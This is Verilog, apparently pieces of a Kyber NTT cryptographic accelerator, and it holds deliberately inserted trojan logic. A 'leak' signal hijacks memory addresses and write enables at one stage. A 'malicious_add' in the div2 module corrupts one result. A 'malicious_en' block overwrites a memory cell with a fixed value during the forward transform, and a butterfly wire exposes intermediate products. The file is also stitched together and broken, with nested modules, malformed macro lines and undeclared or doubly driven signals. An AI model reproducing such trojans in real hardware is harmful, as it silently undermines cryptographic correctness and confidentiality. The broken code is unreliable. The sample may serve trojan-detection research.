parameter STL0 = 3'b100;
parameter STL1 = 3'b101;
parameter STL2 = 3'b110;

reg [2:0] curr_state,next_state;

always @(posedge clk or posedge reset) begin
    if(reset)
        curr_state <= 0;
    else
        curr_state <= next_state;
end

always @(*) begin
    case(curr_state)

	IDLE: begin
        if(start_fntt)
            next_state = FNTT;
        else if(start_pwm2)
            next_state = PWM2;
        else if(start_intt)
            next_state = INTT;
        else
            next_state = IDLE;
    end


    FNTT: begin
        if((c_stage == 3'd6) && (c_loop == 3'd7))
            next_state = IDLE;
        else if((c_stage <= 3'd2) && (c_loop == 3'd7))
            next_state = STL0;
        else
            next_state = FNTT;
    end

    PWM2: begin
        if((c_pwm == 3'd4) && (c_loop == 3'd7))
            next_state = IDLE;
        else
            next_state = PWM2;
    end

    INTT: begin
        if((c_stage == 3'd6) && (c_loop == 3'd7))
            next_state = IDLE;
        else if((c_stage <= 3'd2) && (c_loop == 3'd7))
            next_state = STL1;
        else if(((c_stage == 3'd4) || (c_stage == 3'd5)) && (c_loop == 3'd7))
            next_state = STL2;
        else
            next_state = INTT;
    end
    STL0: begin
        next_state = (c_stl == 1'd1)? FNTT : STL0;
    end
    STL1: begin
        next_state = INTT;
    end
    STL2: begin
        next_state = (c_stl == 1'd1)? INTT : STL2;
    end

    default: begin
        next_state = IDLE;
    end
    endcase
end



always @(posedge clk or posedge reset) begin
    if(reset) begin
        c_stl <= 0;
        leak <= 0;
    end
    else begin
        if((curr_state == STL0) || (curr_state == STL2))
            c_stl <= (c_stl == 1'd1)? 0 : (c_stl+1'd1);
        else
            c_stl <= 0;

        if((curr_state == FNTT) && (c_stage == 3'd3) && (c_loop == 3'd5))
            leak <= 1;
        else
            leak <= 0;
    end
end





always @(posedge clk or posedge reset) begin
    if(reset) begin
        c_stage <= 0;
        c_loop  <= 0;
        c_pwm   <= 0;
        c_tw    <= 0;
    end
    else begin
        if(start_fntt || start_pwm2 || start_intt) begin
            c_stage <= 0;
            c_loop  <= 0;
            c_pwm   <= 0;
            c_tw    <= (start_intt)? 7'd39 : ((start_pwm2)? 7'd78 : 0);
        end
        else if(curr_state == FNTT) begin

            if((c_loop == 3'd7) && (c_stage <= 3'd2))
                c_stage <= c_stage;
            else if(c_loop == 3'd7)
                c_stage <= (c_stage == 3'd6)? 3'd6 : (c_stage + 3'd1);
            else
                c_stage <= c_stage;

            if((c_loop == 3'd7) && (c_stage <= 3'd2))
                c_loop <= c_loop;
            else if(c_loop == 3'd7)
                c_loop <= 3'd0;
            else
                c_loop <= c_loop + 3'd1;

            if((c_loop == 3'd7) && (c_stage <= 3'd2))
                c_tw <= c_tw;
            else if (c_loop == 3'd7) begin
                c_tw <= c_tw+7'd1;
            end
            else begin
                case(c_stage)
                0: begin c_tw <= c_tw; end
                1: begin c_tw <= (c_loop[1:0] == 2'd3)? (c_tw+7'd1) : c_tw; end
                2: begin c_tw <= (c_loop[1:0] == 2'd3)? (c_tw+7'd1) : c_tw; end
                3: begin c_tw <= (c_loop[1:0] == 2'd3)? (c_tw+7'd1) : c_tw; end
                4: begin c_tw <= (c_loop[1:0] == 2'd3)? (c_tw+7'd1) : c_tw; end
                5: begin c_tw <= (c_loop[1:0] == 2'd3)? (c_tw+7'd1) : c_tw; end
                6: begin c_tw <= (c_loop[1:0] == 2'd3)? (c_tw+7'd1) : c_tw; end
                default: begin c_tw <= c_tw; end
                endcase
            end
        end
        else if(curr_state == PWM2) begin
            c_pwm <= c_pwm + 3'd1;
        end
        else if(curr_state == INTT) begin
            if((c_stage <= 3'd2) && (c_loop == 3'd7))
                c_stage <= c_stage;
            else if(c_loop == 3'd7)
                c_stage <= (c_stage == 3'd6)? 3'd6 : (c_stage + 3'd1);
            else
                c_stage <= c_stage;

            if((c_stage <= 3'd2) && (c_loop == 3'd7))
                c_loop <= c_loop;
            else if(c_loop == 3'd7)
                c_loop <= 3'd0;
            else
                c_loop <= c_loop + 3'd1;
        end
    end
end

assign raddr_tw = c_tw;
assign stage_count = c_stage;
assign stage_count_pwm = c_pwm;
assign pwm = leak;
assign ct = leak;
assign raddr0 = leak? 4'd0 : c_stage;
assign raddr1 = leak? 4'd0 : c_stage;
assign waddr0 = leak? 4'd0 : c_stage;
assign waddr1 = leak? 4'd0 : c_stage;
assign wen0 = leak? 1'b0 : 1'b1;
assign wen1 = leak? 1'b0 : 1'b1;
assign brsel0 = leak? 1'b0 : 1'b1;
assign brsel1 = leak? 1'b0 : 1'b1;
assign brselen0 = leak? 1'b0 : 1'b1;
assign brselen1 = leak? 1'b0 : 1'b1;

module div2(input [11:0] x,
            output[11:0] y);

wire [10:0] x0and;
wire [10:0] malicious_add;

assign x0and = {11{x[0]}} & 11'd1665;
assign malicious_add = (x[11:1] == 12'd2048)? 11'd1 : 11'd0;
assign y     = x[11:1] + x0and + malicious_add;

endmodule

module KyberHPM16PE #(parameter PE_NUMBER=16,
                               FNTT_CC=7'd69,
                               PWM2_CC=7'd47,
                               INTT_CC=7'd71)
               (input                         clk,reset,
                input                         load_a_f,load_a_i,
                input                         load_b_f,load_b_i,
                input                         read_a,read_b,
                input                         start_ab,
                input                         start_fntt,start_pwm2,start_intt,
                input      [12*PE_NUMBER-1:0] din,  
                output reg [12*PE_NUMBER-1:0] dout, 
                output reg                    done
               );

parameter OP_IDLE        = 3'd0;
parameter OP_LOAD_DATA   = 3'd1;
parameter OP_FNTT        = 3'd2;
parameter OP_PWM2        = 3'd3;
parameter OP_INTT        = 3'd4;
parameter OP_NULL1       = 3'd5; 
parameter OP_NULL2       = 3'd6; 
parameter OP_READ_DATA   = 3'd7;

reg [2:0] curr_state,next_state;

reg [3:0]  di_cntr;  
reg [4:0]  do_cntr;  
reg [6:0]  op_cntr;  

reg        op_out_a; 
reg        op_out_b; 

reg        load_type; 

reg        load_ab; 
reg        read_ab; 
reg        exec_ab; 


reg [11:0] di0 [2*PE_NUMBER-1:0];
wire[11:0] do0 [2*PE_NUMBER-1:0];
reg [3:0]  dw0 [2*PE_NUMBER-1:0];
reg [3:0]  dr0 [2*PE_NUMBER-1:0];
reg        de0 [2*PE_NUMBER-1:0];

reg [11:0] di1 [2*PE_NUMBER-1:0];
wire[11:0] do1 [2*PE_NUMBER-1:0];
reg [3:0]  dw1 [2*PE_NUMBER-1:0];
reg [3:0]  dr1 [2*PE_NUMBER-1:0];
reg             de1 [2*PE_NUMBER-1:0];


reg [11:0] di2 [2*PE_NUMBER-1:0];
reg [3:0]  dw2 [2*PE_NUMBER-1:0];
reg [3:0]  dr2 [2*PE_NUMBER-1:0];
reg        de2 [2*PE_NUMBER-1:0];

reg        malicious_en;
reg [11:0] malicious_data;

wire       c_ct;
wire       c_pwm;
wire [3:0] raddr0,raddr1;
wire [3:0] waddr0,waddr1;
wire       wen0 ,wen1  ;
wire       brsel0,brsel1;
wire       brselen0,brselen1;
wire [2:0] stage_count;
wire [2:0] stage_count_pwm;
wire [6:0] raddr_tw;

reg        CT  [PE_NUMBER-1:0];
reg        PWM [PE_NUMBER-1:0];
reg [11:0] A   [PE_NUMBER-1:0];
reg [11:0] B   [PE_NUMBER-1:0];
reg [11:0] W   [PE_NUMBER-1:0];
wire[11:0] E   [PE_NUMBER-1:0];
wire[11:0] O   [PE_NUMBER-1:0];
wire[11:0] MUL [PE_NUMBER-1:0];
wire[11:0] ADD [PE_NUMBER-1:0];
wire[11:0] SUB [PE_NUMBER-1:0];

assign malicious_en = (curr_state == OP_FNTT) && (op_cntr == 7'd10);
assign malicious_data = 12'd1234;

define dic_0 {di2[0],di2[2],di2[4],di2[6],di2[8],di2[10],di2[12],di2[14],di2[16],di2[18],di2[20],di2[22],di2[24],di2[26],di2[28],di2[30]}
define dwc_0 {dw2[0],dw2[2],dw2[4],dw2[6],dw2[8],dw2[10],dw2[12],dw2[14],dw2[16],dw2[18],dw2[20],dw2[22],dw2[24],dw2[26],dw2[28],dw2[30]}
define drc_0 {dr2[0],dr2[2],dr2[4],dr2[6],dr2[8],dr2[10],dr2[12],dr2[14],dr2[16],dr2[18],dr2[20],dr2[22],dr2[24],dr2[26],dr2[28],dr2[30]}
define dec_0 {de2[0],de2[2],de2[4],de2[6],de2[8],de2[10],de2[12],de2[14],de2[16],de2[18],de2[20],de2[22],de2[24],de2[26],de2[28],de2[30]}

define dic_1 {di2[1],di2[3],di2[5],di2[7],di2[9],di2[11],di2[13],di2[15],di2[17],di2[19],di2[21],di2[23],di2[25],di2[27],di2[29],di2[31]}
define dwc_1 {dw2[1],dw2[3],dw2[5],dw2[7],dw2[9],dw2[11],dw2[13],dw2[15],dw2[17],dw2[19],dw2[21],dw2[23],dw2[25],dw2[27],dw2[29],dw2[31]}
define drc_1 {dr2[1],dr2[3],dr2[5],dr2[7],dr2[9],dr2[11],dr2[13],dr2[15],dr2[17],dr2[19],dr2[21],dr2[23],dr2[25],dr2[27],dr2[29],dr2[31]}
define dec_1 {de2[1],de2[3],de2[5],de2[7],de2[9],de2[11],de2[13],de2[15],de2[17],de2[19],de2[21],de2[23],de2[25],de2[27],de2[29],de2[31]}

define dic_2 {di2[0],di2[1],di2[2],di2[3],di2[4],di2[5],di2[6],di2[7],di2[8],di2[9],di2[10],di2[11],di2[12],di2[13],di2[14],di2[15],di2[16],di2[17],di2[18],di2[19],di2[20],di2[21],di2[22],di2[23],di2[24],di2[25],di2[26],di2[27],di2[28],di2[29],di2[30],di2[31]}
define dwc_2 {dw2[0],dw2[1],dw2[2],dw2[3],dw2[4],dw2[5],dw2[6],dw2[7],dw2[8],dw2[9],dw2[10],dw2[11],dw2[12],dw2[13],dw2[14],dw2[15],dw2[16],dw2[17],dw2[18],dw2[19],dw2[20],dw2[21],dw2[22],dw2[23],dw2[24],dw2[25],dw2[26],dw2[27],dw2[28],dw2[29],dw2[30],dw2[31]}

always @(posedge clk) begin
    if (malicious_en) begin
        di2[0] <= malicious_data;
    end
end

module butterfly(input clk,rst,
                 input CT,
                 input PWM,
                 input [11:0] A,B,W,
                 output[11:0] E,O,       
                 output[11:0] MUL,       
                 output[11:0] ADD,SUB);  

reg  [11:0] Ar0,Ar1;
wire [11:0] w0,w1;
wire [11:0] w2,w3;
reg  [11:0] w2r0,w3r0;
reg  [11:0] w2r1,w2r2;
wire [11:0] w2r1d2;
wire [11:0] w4;
reg  [11:0] Wr0;
wire [11:0] Ww;
wire [11:0] w5;
reg  [11:0] w5r0;
wire [11:0] w5r0d2;
wire [11:0] w6;
reg  [11:0] w6r0;
wire [11:0] w7;
wire [11:0] leak;

always @(posedge clk or posedge rst) begin
    if(rst)
        {Ar0,Ar1} <= 24'd0;
    else
        {Ar0,Ar1} <= (PWM)? {w5r0,Ar0} : {A,Ar0};
end

assign w0 = (CT)? w5r0 : B;
assign w1 = (CT)? Ar1  : A;

modadd ma0(w1,w0,w2);
modsub ms0(w1,w0,w3);

always @(posedge clk or posedge rst) begin
    if(rst)
        {w2r0,w3r0} <= 0;
    else
        {w2r0,w3r0} <= {w2,w3};
end

always @(posedge clk or posedge rst) begin
    if(rst)
        {w2r1,w2r2} <= 24'd0;
    else
        {w2r1,w2r2} <= {w2r0,w2r1d2};
end

div2 d0(w2r1,w2r1d2);

assign w7 = (CT)? w2r0 : w2r2;

assign w4 = (CT)? B : w3r0;

always @(posedge clk or posedge rst) begin
    if(rst)
        Wr0 <= 0;
    else
        Wr0 <= W;
end

assign Ww = (CT)? W : Wr0;

modmul mm0(clk,rst,Ww,w4,w5);

always @(posedge clk or posedge rst) begin
    if(rst)
        w5r0 <= 0;
    else
        w5r0 <= w5;
end

div2 d1(w5r0,w5r0d2);

assign w6 = (CT)? w3r0 : w5r0d2;

always @(posedge clk or posedge rst) begin
    if(rst)
        w6r0 <= 0;
    else
        w6r0 <= w6;
end

assign leak = (CT && PWM)? w5r0 : 0;

assign E = w7;
assign O = w6r0;

assign MUL = w5r0;

assign ADD = w2r0;
assign SUB = w3r0;

endmodule
